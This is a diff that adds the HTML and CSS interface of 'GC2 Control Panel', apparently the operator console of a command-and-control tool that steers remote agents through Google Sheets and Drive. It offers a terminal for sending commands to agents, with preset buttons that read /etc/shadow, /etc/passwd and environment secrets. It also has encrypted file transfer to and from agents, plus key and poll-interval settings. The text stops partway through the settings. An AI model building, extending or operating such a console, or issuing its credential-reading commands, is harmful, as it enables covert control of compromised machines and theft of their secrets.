@@ -1,0 +1,1424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>GC2 Control Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=IBM+Plex+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg-base:#0a0c0f;--bg-panel:#0f1218;--bg-surface:#151b24;--bg-hover:#1c2535;--bg-active:#1e2d42;
+  --accent:#00d4ff;--accent-dim:#0099bb;--accent-glow:rgba(0,212,255,.12);
+  --danger:#ff4d6d;--danger-dim:rgba(255,77,109,.15);
+  --success:#39d98a;--warning:#f5a623;
+  --enc:#a78bfa;--enc-glow:rgba(167,139,250,.12);
+  --txt:#e2e8f0;--txt2:#7a8fa6;--txt3:#3d5068;--code:#a8d8ea;
+  --br:rgba(255,255,255,.06);--br-a:rgba(0,212,255,.25);
+  --mono:'IBM Plex Mono',monospace;--sans:'IBM Plex Sans',system-ui,sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden;background:var(--bg-base);color:var(--txt);font-family:var(--sans);font-size:13px}
+button{cursor:pointer;font-family:inherit}
+input,textarea{font-family:var(--mono)}
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-thumb{background:var(--txt3);border-radius:9px}
+
+#app{display:flex;flex-direction:column;height:100vh}
+
+/* Header */
+#hdr{height:52px;background:var(--bg-panel);border-bottom:1px solid var(--br);
+     display:flex;align-items:center;padding:0 16px;gap:10px;flex-shrink:0}
+.logo{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:14px;font-weight:600;color:var(--accent);letter-spacing:.04em}
+.logo .dim{color:var(--txt3);font-weight:300}
+.hdr-right{margin-left:auto;display:flex;align-items:center;gap:8px}
+.pill{display:flex;align-items:center;gap:5px;padding:4px 10px;border-radius:99px;font-family:var(--mono);font-size:11px;border:1px solid var(--br);color:var(--txt2);background:var(--bg-surface)}
+.pill .dot{width:6px;height:6px;border-radius:50%;background:var(--txt3)}
+.pill.ok .dot{background:var(--success);box-shadow:0 0 5px var(--success)}
+.pill.err .dot{background:var(--danger)}
+.enc-pill{display:flex;align-items:center;gap:5px;padding:4px 10px;border-radius:99px;font-family:var(--mono);font-size:11px;border:1px solid rgba(167,139,250,.3);color:var(--enc);background:var(--enc-glow)}
+.enc-pill.off{border-color:var(--br);color:var(--txt3);background:transparent}
+.acct-wrap{display:flex;align-items:center;gap:4px}
+.acct-wrap select{background:var(--bg-surface);border:1px solid var(--br);border-radius:4px;
+  color:var(--txt);font-family:var(--mono);font-size:11px;padding:4px 6px;outline:none;max-width:200px}
+.acct-wrap select:focus{border-color:var(--br-a)}
+
+.btn{display:inline-flex;align-items:center;gap:5px;padding:6px 11px;border-radius:4px;border:1px solid var(--br);background:var(--bg-surface);color:var(--txt);font-size:12px;font-family:var(--mono);transition:.12s;white-space:nowrap}
+.btn:hover{border-color:var(--br-a);background:var(--bg-hover);color:var(--accent)}
+.btn.pri{background:var(--accent);border-color:var(--accent);color:#000;font-weight:600}
+.btn.pri:hover{background:var(--accent-dim);border-color:var(--accent-dim)}
+.btn.red{border-color:rgba(255,77,109,.4);color:var(--danger)}
+.btn.red:hover{background:var(--danger-dim)}
+.btn:disabled{opacity:.35;cursor:not-allowed}
+.btn.sm{padding:3px 8px;font-size:11px}
+
+#body{display:flex;flex:1;overflow:hidden}
+
+/* Sidebar */
+#sidebar{width:250px;background:var(--bg-panel);border-right:1px solid var(--br);display:flex;flex-direction:column;flex-shrink:0;overflow:hidden}
+.slbl{padding:10px 12px 4px;font-size:10px;font-family:var(--mono);letter-spacing:.12em;color:var(--txt3);text-transform:uppercase;display:flex;align-items:center;justify-content:space-between}
+.agent-list{flex:1;overflow-y:auto;padding:4px 8px}
+.section-lbl{padding:8px 6px 4px;font-size:9px;font-family:var(--mono);letter-spacing:.14em;color:var(--txt3);text-transform:uppercase;display:flex;align-items:center;gap:6px}
+.section-lbl .count{color:var(--txt3);font-size:9px}
+.agent-item{display:flex;align-items:center;gap:8px;padding:7px 8px;border-radius:4px;cursor:pointer;border:1px solid transparent;margin-bottom:2px;transition:.12s}
+.agent-item:hover{background:var(--bg-hover)}
+.agent-item.active{background:var(--bg-active);border-color:var(--br-a)}
+.agent-item.archived .agent-dot{background:var(--txt3);box-shadow:none}
+.agent-dot{width:7px;height:7px;border-radius:50%;background:var(--success);box-shadow:0 0 5px var(--success);flex-shrink:0}
+.agent-name{font-family:var(--mono);font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
+.agent-enc{font-family:var(--mono);font-size:9px;padding:1px 4px;border-radius:3px;background:var(--enc-glow);color:var(--enc);border:1px solid rgba(167,139,250,.2);flex-shrink:0}
+.agent-item .mini-btn{background:transparent;border:none;color:var(--txt3);padding:2px 4px;border-radius:3px;font-size:11px;line-height:1}
+.agent-item .mini-btn:hover{color:var(--danger);background:var(--danger-dim)}
+.snav{border-top:1px solid var(--br);padding:8px}
+.nav-btn{display:flex;align-items:center;gap:8px;padding:8px;border-radius:4px;cursor:pointer;border:none;background:transparent;color:var(--txt2);font-size:12px;font-family:var(--mono);width:100%;transition:.12s}
+.nav-btn:hover{background:var(--bg-hover);color:var(--txt)}
+.nav-btn.active{color:var(--accent);background:var(--accent-glow)}
+.empty-mini{padding:6px 8px;font-family:var(--mono);font-size:10px;color:var(--txt3);font-style:italic}
+
+/* Content */
+#content{flex:1;overflow:hidden;display:flex;flex-direction:column}
+.view{display:none;flex:1;overflow:hidden;flex-direction:column}
+.view.active{display:flex}
+
+/* Terminal */
+.term-hdr{padding:10px 14px;border-bottom:1px solid var(--br);display:flex;align-items:center;gap:8px;flex-shrink:0;background:var(--bg-panel);flex-wrap:wrap}
+.agent-ttl{flex:1;min-width:120px}
+.agent-ttl .lbl{font-family:var(--mono);font-size:10px;color:var(--txt3);letter-spacing:.08em}
+.agent-ttl .name{font-family:var(--mono);font-size:14px;color:var(--accent);font-weight:500;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.archived-tag{font-size:9px;padding:1px 5px;border-radius:3px;background:var(--danger-dim);color:var(--danger);font-weight:400;letter-spacing:.05em}
+.ticker-ctl{display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:11px;color:var(--txt2)}
+.ticker-ctl input{width:46px;padding:3px 5px;background:var(--bg-surface);border:1px solid var(--br);border-radius:3px;color:var(--txt);font-size:12px;text-align:center;outline:none}
+.ticker-ctl input:focus{border-color:var(--br-a)}
+
+.subtabs{display:flex;border-bottom:1px solid var(--br);background:var(--bg-panel);flex-shrink:0;padding:0 8px;gap:2px}
+.subtab{padding:8px 14px;background:transparent;border:none;border-bottom:2px solid transparent;
+  font-family:var(--mono);font-size:11px;letter-spacing:.05em;color:var(--txt2);cursor:pointer;transition:.12s}
+.subtab:hover{color:var(--txt)}
+.subtab.active{color:var(--accent);border-bottom-color:var(--accent)}
+
+.subpane{flex:1;overflow:hidden;display:none;flex-direction:column;min-height:0}
+.subpane.active{display:flex}
+
+#term-out{flex:1;overflow-y:auto;padding:12px 16px;background:var(--bg-base)}
+.cmd-block{margin-bottom:14px;padding-left:12px;border-left:2px solid var(--txt3);animation:fi .2s ease}
+@keyframes fi{from{opacity:0;transform:translateY(3px)}to{opacity:1}}
+.cmd-block.pend{border-left-color:var(--warning)}
+.cmd-block.done{border-left-color:var(--br-a)}
+.cmd-block.old{opacity:.35}
+.cmd-block.del{opacity:.55;border-left-color:var(--danger)}
+.cmd-meta{display:flex;align-items:center;gap:6px;margin-bottom:4px;flex-wrap:wrap}
+.pr{font-family:var(--mono);font-size:11px;color:var(--accent)}
+.ct{font-family:var(--mono);font-size:13px;font-weight:500}
+.ts{margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--txt3)}
+.bdg{font-family:var(--mono);font-size:9px;padding:2px 5px;border-radius:99px;font-weight:600}
+.bdg.pend{background:rgba(245,166,35,.15);color:var(--warning)}
+.bdg.done{background:rgba(57,217,138,.1);color:var(--success)}
+.bdg.enc{background:var(--enc-glow);color:var(--enc);border:1px solid rgba(167,139,250,.25)}
+.bdg.del{background:var(--danger-dim);color:var(--danger)}
+.cmd-out{font-family:var(--mono);font-size:12px;color:var(--code);white-space:pre-wrap;word-break:break-all;line-height:1.7;background:var(--bg-surface);border-radius:4px;padding:8px 10px;border:1px solid var(--br);margin-top:4px}
+.cmd-out.empty{color:var(--txt3);font-style:italic}
+
+.quick-cmds{display:flex;gap:5px;padding:6px 16px 0;flex-wrap:wrap;flex-shrink:0}
+.qcmd{font-family:var(--mono);font-size:11px;padding:3px 7px;border-radius:3px;border:1px solid var(--br);background:var(--bg-surface);color:var(--txt2);cursor:pointer;transition:.1s}
+.qcmd:hover{border-color:var(--br-a);color:var(--accent)}
+
+.input-bar{border-top:1px solid var(--br);padding:10px 16px;display:flex;gap:8px;background:var(--bg-panel);flex-shrink:0;align-items:center}
+.ipr{font-family:var(--mono);font-size:13px;color:var(--accent);flex-shrink:0}
+#cmd-inp{flex:1;background:var(--bg-surface);border:1px solid var(--br);border-radius:4px;padding:7px 10px;color:var(--txt);font-size:13px;outline:none;transition:.15s}
+#cmd-inp:focus{border-color:var(--br-a)}
+#cmd-inp::placeholder{color:var(--txt3)}
+
+/* DB tab */
+.db-wrap{flex:1;overflow:auto;padding:12px 16px;background:var(--bg-base)}
+.db-table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px}
+.db-table th,.db-table td{border-bottom:1px solid var(--br);padding:6px 8px;text-align:left;vertical-align:top}
+.db-table th{background:var(--bg-panel);color:var(--txt3);font-size:10px;text-transform:uppercase;letter-spacing:.08em;position:sticky;top:0}
+.db-table td.row-num{color:var(--txt3);width:40px}
+.db-table td.cmd{color:var(--accent);white-space:pre-wrap;word-break:break-all;max-width:280px}
+.db-table td.out{color:var(--code);white-space:pre-wrap;word-break:break-all}
+.db-table td.ts{color:var(--txt3);white-space:nowrap;width:140px}
+.db-table td.flags{color:var(--txt2);white-space:nowrap;width:100px}
+.db-table tr.deleted td{opacity:.5}
+
+/* Logs tab */
+.logs-wrap{flex:1;overflow-y:auto;padding:10px 16px;background:var(--bg-base);font-family:var(--mono);font-size:11px}
+.log-row{display:flex;gap:8px;padding:3px 0;border-bottom:1px dashed var(--br);line-height:1.6}
+.log-row .ts{color:var(--txt3);min-width:150px;flex-shrink:0}
+.log-row .lv{min-width:50px;font-weight:600;flex-shrink:0}
+.log-row.info .lv{color:var(--accent)}
+.log-row.warn .lv{color:var(--warning)}
+.log-row.error .lv{color:var(--danger)}
+.log-row .src{color:var(--txt3);min-width:70px;flex-shrink:0}
+.log-row .msg{flex:1;color:var(--txt);white-space:pre-wrap;word-break:break-word}
+
+.no-sel{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;color:var(--txt3);font-family:var(--mono)}
+.no-sel svg{opacity:.25}
+.no-sel h3{color:var(--txt2);font-size:14px;font-weight:400}
+.no-sel p{font-size:12px;text-align:center;max-width:260px;line-height:1.6}
+.empty-note{padding:30px;text-align:center;color:var(--txt3);font-family:var(--mono);font-size:12px}
+
+/* Drive */
+.drive-hdr{padding:12px 16px;border-bottom:1px solid var(--br);display:flex;align-items:center;gap:10px;flex-shrink:0;background:var(--bg-panel)}
+.drive-hdr h2{font-family:var(--mono);font-size:14px;font-weight:500;flex:1}
+.drive-body{flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:14px}
+.upload-zone{border:2px dashed var(--br);border-radius:8px;padding:22px;text-align:center;cursor:pointer;transition:.2s;background:var(--bg-panel)}
+.upload-zone:hover,.upload-zone.drag{border-color:var(--br-a);background:var(--accent-glow)}
+.upload-zone p{font-family:var(--mono);font-size:12px;color:var(--txt2);margin-top:8px}
+.upload-zone strong{color:var(--accent)}
+#file-inp{display:none}
+.prog-wrap{background:var(--bg-surface);border:1px solid var(--br);border-radius:4px;padding:10px 14px;font-family:var(--mono);font-size:12px;color:var(--txt2);display:none}
+.prog-bar-bg{height:3px;background:var(--bg-hover);border-radius:9px;margin-top:8px;overflow:hidden}
+.prog-bar{height:100%;background:var(--accent);border-radius:9px;transition:width .2s}
+.ftable{background:var(--bg-panel);border:1px solid var(--br);border-radius:8px;overflow:hidden}
+.fhdr{display:grid;grid-template-columns:1fr 70px 115px 110px;padding:8px 14px;font-family:var(--mono);font-size:10px;color:var(--txt3);letter-spacing:.1em;text-transform:uppercase;border-bottom:1px solid var(--br);background:var(--bg-surface)}
+.frow{display:grid;grid-template-columns:1fr 70px 115px 110px;padding:9px 14px;align-items:center;border-bottom:1px solid var(--br);transition:.1s}
+.frow:last-child{border-bottom:none}
+.frow:hover{background:var(--bg-hover)}
+.fname{font-family:var(--mono);font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.fsize,.fdate{font-family:var(--mono);font-size:11px;color:var(--txt2)}
+.factions{display:flex;gap:4px}
+.enc-tag{font-family:var(--mono);font-size:9px;padding:1px 4px;border-radius:3px;background:var(--enc-glow);color:var(--enc);border:1px solid rgba(167,139,250,.2);margin-left:4px;vertical-align:middle}
+.drive-hint{font-family:var(--mono);font-size:11px;color:var(--txt3);line-height:1.8;background:var(--bg-panel);border:1px solid var(--br);border-radius:8px;padding:14px}
+.drive-hint code{color:var(--accent)}
+.drive-hint strong{color:var(--txt2)}
+
+/* Config */
+#view-config{overflow-y:auto}
+.cfg-body{padding:22px;max-width:640px}
+.cfg-body>h2{font-family:var(--mono);font-size:16px;font-weight:500;margin-bottom:4px}
+.cfg-body>.sub{font-family:var(--mono);font-size:12px;color:var(--txt2);margin-bottom:20px}
+.cfg-card{background:var(--bg-panel);border:1px solid var(--br);border-radius:8px;padding:18px;margin-bottom:14px}
+.cfg-card h3{font-family:var(--mono);font-size:11px;font-weight:500;color:var(--accent);margin-bottom:14px;letter-spacing:.08em;text-transform:uppercase}
+.fg{margin-bottom:12px}
+.fg label{display:block;font-family:var(--mono);font-size:11px;color:var(--txt2);margin-bottom:5px}
+.fg input{width:100%;background:var(--bg-surface);border:1px solid var(--br);border-radius:4px;padding:7px 10px;color:var(--txt);font-size:12px;outline:none;transition:.15s}
+.fg input:focus{border-color:var(--br-a)}
+.fg input[type="checkbox"]{width:auto;margin-right:6px;vertical-align:middle}
+.auth-box{padding:10px 14px;border-radius:4px;font-family:var(--mono);font-size:12px;margin-bottom:12px;border:1px solid var(--br);background:var(--bg-surface);color:var(--txt2)}
+.auth-box.ok{border-color:rgba(57,217,138,.3);color:var(--success);background:rgba(57,217,138,.05)}
+.auth-box.err{border-color:var(--danger);color:var(--danger);background:var(--danger-dim)}
+.krow{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.krow input{flex:1;min-width:200px}
+.kdisplay{font-family:var(--mono);font-size:11px;padding:8px 10px;background:var(--bg-surface);border:1px solid rgba(167,139,250,.3);border-radius:4px;color:var(--enc);word-break:break-all;margin-top:8px;display:none;line-height:1.6}
+.knote{font-family:var(--mono);font-size:11px;margin-top:6px;line-height:1.6}
+.warn-box{padding:10px 14px;border-radius:4px;font-family:var(--mono);font-size:11px;border:1px solid rgba(245,166,35,.4);background:rgba(245,166,35,.06);color:var(--warning);line-height:1.6;margin-bottom:12px}
+.akt{background:var(--bg-surface);border:1px solid var(--br);border-radius:6px;overflow:hidden;margin-top:10px}
+.akh{display:grid;grid-template-columns:1fr 160px 80px;padding:7px 12px;font-family:var(--mono);font-size:10px;color:var(--txt3);letter-spacing:.08em;text-transform:uppercase;border-bottom:1px solid var(--br)}
+.akrow{display:grid;grid-template-columns:1fr 160px 80px;padding:8px 12px;align-items:center;border-bottom:1px solid var(--br)}
+.akrow:last-child{border-bottom:none}
+.akrow:hover{background:var(--bg-hover)}
+.aname{font-family:var(--mono);font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.akey{font-family:var(--mono);font-size:11px;color:var(--enc)}
+.acct-row{display:flex;align-items:center;gap:10px;padding:8px 12px;border-bottom:1px solid var(--br);font-family:var(--mono);font-size:12px}
+.acct-row:last-child{border-bottom:none}
+.acct-row.active{background:var(--accent-glow);color:var(--accent)}
+.acct-row .em{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* Modal */
+.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.6);display:flex;align-items:center;justify-content:center;z-index:200;display:none}
+.modal-bg.show{display:flex}
+.modal{background:var(--bg-panel);border:1px solid var(--br);border-radius:8px;padding:22px;min-width:380px;max-width:500px}
+.modal h3{font-family:var(--mono);font-size:14px;margin-bottom:10px}
+.modal p{font-family:var(--mono);font-size:12px;color:var(--txt2);line-height:1.7;margin-bottom:16px}
+.modal p strong{color:var(--danger)}
+.modal-btns{display:flex;gap:8px;justify-content:flex-end;margin-top:16px}
+.modal-content{font-family:var(--mono);font-size:12px;color:var(--txt2);line-height:1.7}
+.checkbox-line{display:flex;align-items:flex-start;gap:8px;padding:8px 10px;border:1px solid var(--br);border-radius:4px;margin-bottom:8px;font-family:var(--mono);font-size:12px;color:var(--txt);cursor:pointer}
+.checkbox-line:hover{border-color:var(--br-a)}
+.checkbox-line input{margin-top:2px}
+.checkbox-line .lbl-title{font-weight:500;color:var(--txt)}
+.checkbox-line .lbl-sub{display:block;color:var(--txt3);font-size:11px;margin-top:2px;line-height:1.5}
+
+#toasts{position:fixed;bottom:20px;right:20px;display:flex;flex-direction:column;gap:7px;z-index:400}
+.toast{padding:10px 14px;border-radius:4px;font-family:var(--mono);font-size:12px;background:var(--bg-surface);border:1px solid var(--br);color:var(--txt);animation:si .2s ease;max-width:360px}
+.toast.ok{border-color:var(--success);color:var(--success)}
+.toast.err{border-color:var(--danger);color:var(--danger)}
+.toast.warn{border-color:var(--warning);color:var(--warning)}
+@keyframes si{from{opacity:0;transform:translateX(12px)}to{opacity:1;transform:none}}
+@keyframes spin{to{transform:rotate(360deg)}}
+.spin{animation:spin .55s linear infinite}
+</style>
+</head>
+<body>
+<div id="app">
+
+<!-- ── Header ── -->
+<header id="hdr">
+  <div class="logo">
+    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
+    </svg>
+    GC2 <span class="dim">/ control</span>
+  </div>
+  <div class="hdr-right">
+    <div class="acct-wrap">
+      <select id="acct-select" title="Active Gmail account"></select>
+      <button class="btn sm" id="btn-acct-add" title="Add Gmail account">+</button>
+    </div>
+    <div class="enc-pill off" id="enc-pill">
+      <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+        <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      <span id="enc-lbl">No encryption</span>
+    </div>
+    <div class="pill" id="auth-pill"><span class="dot"></span><span id="auth-lbl">Checking…</span></div>
+  </div>
+</header>
+
+<div id="body">
+
+<!-- ── Sidebar ── -->
+<aside id="sidebar">
+  <div class="slbl">
+    <span>Agents</span>
+    <button class="btn sm" id="btn-refresh-agents" title="Load agent list from Sheet (manual)">⟳</button>
+  </div>
+  <div class="agent-list" id="agent-list">
+    <div class="section-lbl" id="live-section-lbl">Live <span class="count" id="live-count"></span></div>
+    <div id="live-list"><div class="empty-mini">Click ⟳ to load from Sheet</div></div>
+
+    <div class="section-lbl" id="archived-section-lbl" style="margin-top:12px">Archived <span class="count" id="arch-count"></span></div>
+    <div id="archived-list"><div class="empty-mini">No archived sessions</div></div>
+  </div>
+  <div class="snav">
+    <button class="nav-btn active" id="nav-terminal" onclick="switchView('terminal')">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
+      </svg>Terminal
+    </button>
+    <button class="nav-btn" id="nav-drive" onclick="switchView('drive')">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/>
+      </svg>Drive
+    </button>
+    <button class="nav-btn" id="nav-config" onclick="switchView('config')">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <circle cx="12" cy="12" r="3"/>
+        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
+      </svg>Settings
+    </button>
+  </div>
+</aside>
+
+<!-- ── Content ── -->
+<main id="content">
+
+  <!-- Terminal view -->
+  <div class="view active" id="view-terminal">
+    <div class="no-sel" id="no-agent">
+      <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+        <rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/>
+      </svg>
+      <h3>No agent selected</h3>
+      <p>Click ⟳ in the sidebar to load agents from Sheet, or select a local session.</p>
+    </div>
+
+    <div id="agent-term" style="display:none;flex-direction:column;flex:1;overflow:hidden">
+      <div class="term-hdr">
+        <div class="agent-ttl">
+          <div class="lbl">SESSION</div>
+          <div class="name" id="term-name">—</div>
+        </div>
+        <div class="ticker-ctl" id="ticker-ctl-wrap" title="Agent poll interval (writes Sheet cell E2)">
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+          </svg>
+          Agent poll <input type="number" id="ticker-inp" min="1" max="3600" value="10"/> s
+          <button class="btn sm" id="btn-ticker">Set</button>
+        </div>
+        <button class="btn sm" id="btn-key-agent" title="Set encryption key for this agent">🔑 Key</button>
+        <button class="btn sm" id="btn-fetch" title="Fetch from Sheet now">↻ Fetch</button>
+        <button class="btn sm" id="btn-clear-view" title="Hide rows up to the latest one">Clear to here</button>
+        <button class="btn sm red" id="btn-clear-sess">Clear session</button>
+        <button class="btn sm red" id="btn-del-tab">Delete tab</button>
+        <button class="btn sm red" id="btn-del-db" style="display:none" title="Delete this session from local DB">Delete from DB</button>
+      </div>
+
+      <div class="subtabs">
+        <button class="subtab" data-subtab="db" id="subtab-db">Database</button>
+        <button class="subtab active" data-subtab="terminal" id="subtab-terminal">Terminal</button>
+        <button class="subtab" data-subtab="logs" id="subtab-logs">Logs</button>
+      </div>
+
+      <div class="subpane" id="pane-db">
+        <div class="db-wrap" id="db-wrap">
+          <div class="empty-note">Local database — historical commands preserved even if Sheet data is deleted.</div>
+        </div>
+      </div>
+
+      <div class="subpane active" id="pane-terminal">
+        <div id="term-out"></div>
+        <div class="quick-cmds">
+          <span class="qcmd" onclick="fillCmd('id')">id</span>
+          <span class="qcmd" onclick="fillCmd('whoami')">whoami</span>
+          <span class="qcmd" onclick="fillCmd('uname -a')">uname -a</span>
+          <span class="qcmd" onclick="fillCmd('hostname')">hostname</span>
+          <span class="qcmd" onclick="fillCmd('pwd')">pwd</span>
+          <span class="qcmd" onclick="fillCmd('ls -la')">ls -la</span>
+          <span class="qcmd" onclick="fillCmd('ifconfig')">ifconfig</span>
+          <span class="qcmd" onclick="fillCmd('ip a')">ip a</span>
+          <span class="qcmd" onclick="fillCmd('ps aux')">ps aux</span>
+          <span class="qcmd" onclick="fillCmd('env')">env</span>
+          <span class="qcmd" onclick="fillCmd('cat /etc/passwd')">passwd</span>
+          <span class="qcmd" onclick="fillCmd('cat /etc/shadow')">shadow</span>
+          <span class="qcmd" onclick="fillCmd('exit')">exit ⚠</span>
+        </div>
+        <div class="input-bar">
+          <span class="ipr">$</span>
+          <input type="text" id="cmd-inp" placeholder="Enter command…" autocomplete="off" spellcheck="false"/>
+          <button class="btn pri" id="btn-send">Send</button>
+        </div>
+      </div>
+
+      <div class="subpane" id="pane-logs">
+        <div class="logs-wrap" id="logs-wrap">
+          <div class="empty-note">No logs yet.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Drive view -->
+  <div class="view" id="view-drive">
+    <div class="drive-hdr">
+      <h2>Drive — File Transfer</h2>
+      <button class="btn" id="btn-drive-refresh">
+        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
+        </svg>Refresh
+      </button>
+    </div>
+    <div class="drive-body">
+      <div class="upload-zone" id="upload-zone">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5">
+          <polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/>
+          <path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/>
+        </svg>
+        <p><strong>Click or drag & drop</strong> — file will be AES-encrypted before upload</p>
+        <input type="file" id="file-inp"/>
+      </div>
+      <div class="prog-wrap" id="prog-wrap">
+        <span id="prog-lbl">Encrypting & uploading…</span>
+        <div class="prog-bar-bg"><div class="prog-bar" id="prog-bar" style="width:0%"></div></div>
+      </div>
+      <div class="ftable">
+        <div class="fhdr"><div>Name</div><div>Size</div><div>Modified</div><div>Actions</div></div>
+        <div id="flist" style="font-family:var(--mono);font-size:12px;color:var(--txt3);padding:14px">Loading…</div>
+      </div>
+      <div class="drive-hint">
+        <strong>Send file to agent:</strong><br/>
+        1. Upload here → file is encrypted → copy <strong>File ID</strong><br/>
+        2. Terminal: <code>download;&lt;FILE_ID&gt;;&lt;/tmp/file.enc&gt;</code>  — agent decrypts after download<br/><br/>
+        <strong>Receive file from agent:</strong><br/>
+        1. Terminal: <code>upload;&lt;/path/to/file&gt;</code> — agent encrypts & uploads to Drive<br/>
+        2. File appears below → click <strong>🔓 DL</strong> to decrypt & download
+      </div>
+    </div>
+  </div>
+
+  <!-- Config view -->
+  <div class="view" id="view-config">
+    <div class="cfg-body">
+      <h2>Settings</h2>
+      <p class="sub">OAuth2, resource IDs, accounts, encryption keys, and poll intervals</p>
+
+      <div class="cfg-card">
+        <h3>Gmail Accounts</h3>
+        <div id="acct-list-container">
+          <div style="font-family:var(--mono);font-size:11px;color:var(--txt3)">Loading…</div>
+        </div>
+        <button class="btn pri" id="btn-add-account" style="margin-top:10px">+ Add Gmail account</button>
+      </div>
+
+      <div class="cfg-card">
+        <h3>Authentication</h3>
+        <div class="auth-box" id="auth-box">Checking…</div>
+        <p style="font-family:var(--mono);font-size:11px;color:var(--txt3);margin-bottom:10px;line-height:1.6">
+          Place <strong style="color:var(--txt2)">credentials.json</strong> in <code style="color:var(--accent)">config/</code>.
+        </p>
+        <button class="btn pri" id="btn-login">Login with Google</button>
+      </div>
+
+      <div class="cfg-card">
+        <h3>Google Resource IDs</h3>
+        <div class="fg"><label>Sheet ID</label><input type="text" id="cfg-sheet"/></div>
+        <div class="fg"><label>Drive Folder ID</label><input type="text" id="cfg-drive"/></div>
+        <button class="btn pri" id="btn-save-ids">Save</button>
+      </div>
+
+      <div class="cfg-card">
+        <h3>Global Encryption Key (AES-256-GCM)</h3>
+        <div class="warn-box">
+          ⚠ This is the fallback key for all agents that don't have a per-agent key.
+        </div>
+        <div class="krow">
+          <input type="text" id="cfg-key" placeholder="64-char hex…" style="font-size:11px"/>
+          <button class="btn" id="btn-gen-key">Generate</button>
+          <button class="btn pri" id="btn-save-key">Save</button>
+        </div>
+        <div class="kdisplay" id="kdisplay"></div>
+        <div class="knote" id="knote" style="color:var(--txt3)">No key set — plaintext mode.</div>
+      </div>
+
+      <div class="cfg-card">
+        <h3>Per-Agent Encryption Keys</h3>
+        <p style="font-family:var(--mono);font-size:11px;color:var(--txt3);margin-bottom:12px;line-height:1.6">
+          Per-agent key overrides the global key. Use the 🔑 Key button in the terminal header, or manage here.
+        </p>
+        <div id="akt-container">
+          <div style="font-family:var(--mono);font-size:11px;color:var(--txt3)">Load agents to see per-agent keys.</div>
+        </div>
+      </div>
+
+      <div class="cfg-card">
+        <h3>Web UI Poll Interval</h3>
+        <p style="font-family:var(--mono);font-size:11px;color:var(--txt3);margin-bottom:12px;line-height:1.6">
+          How often the browser auto-fetches Sheet data while on the <strong>Terminal</strong> sub-tab.
+          This does not affect the agent's own poll interval (Sheet cell E2).
+          The agent list itself is <strong>never</strong> auto-polled — use the ⟳ button.
+        </p>
+        <div class="krow">
+          <input type="number" id="cfg-webpoll" min="5" max="3600" style="width:120px"/>
